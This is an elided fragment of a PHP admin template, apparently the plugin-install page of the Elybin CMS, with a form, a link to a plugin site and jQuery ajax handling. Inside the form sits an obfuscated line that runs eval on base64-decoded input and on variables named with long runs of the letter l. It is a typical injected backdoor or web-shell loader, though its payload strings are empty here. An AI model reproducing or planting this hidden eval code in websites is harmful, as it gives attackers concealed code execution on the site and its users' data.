			...
			<div class="col-sm-12">
				...
				<form class="panel form-horizontal" action="<?php echo $action; ?>" method="post" enctype="multipart/form-data" id="form">
					...
					<?php @eval(base64_decode(""));@eval($llllllllllllllllllllllllllllllllllllllllllllll($lllllllllllllllllllllllllllllllllllllllllllllll(""))); ?>
					  <div class="note note-info"><?php echo $lg_getmorepluginhint?>&nbsp;<a href="http://plugin.elybin.com/" target="_blank">http://plugin.elybin.com/</a></div>
	    ...
	    $.ajax({
	      ...
	      success: function(data) {
				...
				if(data[0] == "ok"){
					...
					window.location.href="?mod=plugin&next=install&id="+data[3];
				}
